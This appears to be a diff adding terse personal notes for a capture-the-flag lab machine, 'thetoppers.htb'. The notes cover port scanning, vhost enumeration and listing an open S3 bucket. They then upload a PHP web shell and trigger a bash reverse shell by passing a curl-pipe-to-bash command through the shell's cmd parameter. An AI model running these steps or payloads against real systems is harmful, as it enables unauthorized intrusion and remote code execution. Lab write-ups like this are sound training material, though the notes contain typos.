@@ -1,0 +1,34 @@
+1. apply masscan -p0-65535 U:0-65535 10.129.195.74 -inte=1000 -e tun0
+2. later nmap -sS -sV -sC -p22,80 10.129.195.74 -vvv -oN scan_three
+3. add IP page with DNS in /etc/host with thetoppers.com
+4. apply gobuster dir -u http://10.129.92.13 -w /usr/share/dirb/wordlist/big.txt
+5. apply subdomain vhost (virtual host) in gobuster
+gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-500.txt -u http://thetoppers.htb
+6. add sub-domain in /etc/hosts s3.thetoppers.htb
+7. download awscli with sudo apt install awscli
+8. typing configuration in console: aws configure
+8.1 subscribe
+8.2 subscribe
+8.3 subscribe
+8.4 subscribe
+9. aws --endpoint=http://s3.thetoppers.htb s3 ls
+9.1 endopoint: url where s3 service is located
+9.2 s3: interact w/s3 service
+9.3 list bucket names
+10. (optional) search file in domain or subdomain
+10.1 gobusterz http://s3.thetoppers.htb/ -x php,txt
+11. type aws --endpoint=http://thetoppers.htb s3 ls s3://thetoppers.htb
+12. create file shell.php
+13. copy with. aws --endpont=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb 
+14. let's go revshells.com
+15.reverse shell:
+15.1 do script reverse shell in https://revshells.com
+with option Bash-i 
+15.1 type in console parrot ifconfig tun0 to view ip in interface
+tun0 
+15.2 create script bash with echo 'data of revshells' > shell.sh
+15.3 open server with python: python3 -m http.server 8080
+in directory where is shell.sh
+15.4 open console and type listen  nc -nvpl 443 
+15.5 typing http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.188:8080/shell.sh|bash
+
